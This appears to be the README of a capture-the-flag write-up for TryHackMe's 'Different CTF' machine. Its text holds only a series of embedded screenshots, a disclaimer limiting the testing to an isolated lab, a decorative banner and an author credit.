<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_27_15" src="https://github.com/user-attachments/assets/8c08e4ee-1597-4511-8da8-1c3966468cac" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_28_56" src="https://github.com/user-attachments/assets/db6ce39e-d579-4225-9404-319f56ef23b9" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_29_19" src="https://github.com/user-attachments/assets/e955af01-24df-48f3-b555-0641505be0df" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_30_22" src="https://github.com/user-attachments/assets/82f21623-c60f-4c64-a0bf-3e08d76ce226" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_31_36" src="https://github.com/user-attachments/assets/9966b613-1765-4655-85c8-7928f4a99244" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_31_40" src="https://github.com/user-attachments/assets/4e18d5f7-84ee-40f0-a3c5-87c9b6421c90" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_32_55" src="https://github.com/user-attachments/assets/3eeb160a-2c9b-44aa-9d2d-11164a7b99bb" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_39_51" src="https://github.com/user-attachments/assets/f4893a54-8d27-42cc-ac9f-d9bed8168f08" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_41_29" src="https://github.com/user-attachments/assets/db033b6a-e43c-43ad-ac90-2a17c39c6e82" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_42_48" src="https://github.com/user-attachments/assets/a89e1eb4-ac9b-4422-beff-c9814dbc2364" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_43_08" src="https://github.com/user-attachments/assets/5a551602-fb0e-4d98-bd62-526c49b89d6f" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_44_34" src="https://github.com/user-attachments/assets/1ae9c096-a9a9-47e0-8740-b9188a5688dc" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_46_20" src="https://github.com/user-attachments/assets/1c53da54-3582-43ff-bcd2-faf5c3c4ed8b" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_48_33" src="https://github.com/user-attachments/assets/13c7ef47-5dca-4439-a0ec-9b44232e6517" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_53_21" src="https://github.com/user-attachments/assets/b156dcff-5547-4f6e-8391-9a9e46295dea" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_55_33" src="https://github.com/user-attachments/assets/283bc02d-24d8-4eeb-975b-1f2310a572b6" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_01_04_22" src="https://github.com/user-attachments/assets/615c2ef2-1a86-4e9a-a38c-67dbb802eefb" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_01_04_37" src="https://github.com/user-attachments/assets/ff40ca37-75bd-4481-a6c2-38b09c1aba06" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_01_04_46" src="https://github.com/user-attachments/assets/e064171d-a379-443f-96ec-0ce1aab32a51" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_01_04_55" src="https://github.com/user-attachments/assets/d8480915-b948-413d-9ddf-c9c01d225185" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_01_07_07" src="https://github.com/user-attachments/assets/6a4e66d1-6754-4603-8b84-0c63c4438e4d" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_01_07_15" src="https://github.com/user-attachments/assets/c2fecc7b-9f5f-4744-a991-b2bd979dee4e" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_01_08_52" src="https://github.com/user-attachments/assets/9b77d612-861c-455a-93a1-bd8fdadf645d" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_01_10_17" src="https://github.com/user-attachments/assets/2217f1b7-af81-4a86-aa2c-53ef5920c294" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_01_11_45" src="https://github.com/user-attachments/assets/ac00f15d-8434-4f52-8e9d-0c8c56b2480b" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_01_12_37" src="https://github.com/user-attachments/assets/eda47f5a-5dcf-4cd6-8760-fbd6bcf0dee5" />


<div align="center">

# 📜 **DISCLAIMER**

</div>

> This write-up documents testing performed exclusively against the intentionally vulnerable **Different CTF** VM (TryHackMe) in an isolated personal lab, for educational purposes only. Do not use these techniques against systems you do not own or lack explicit authorization to test.

---

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&color=0:0f0c29,50:302b63,100:24243e&height=180&section=footer&text=Happy%20Hacking!&fontSize=50&fontColor=F75C03&animation=twinkling&fontAlignY=70"/>

<br>

**Author:** Nishant Saini · [GitHub](https://github.com/nishantsaini5786)

⭐ **If this helped you, consider starring the repo!**

<br>

<img src="https://user-images.githubusercontent.com/74038190/212284158-e840e285-664b-44d7-b79b-e264b5e54825.gif" width="500">

</div>
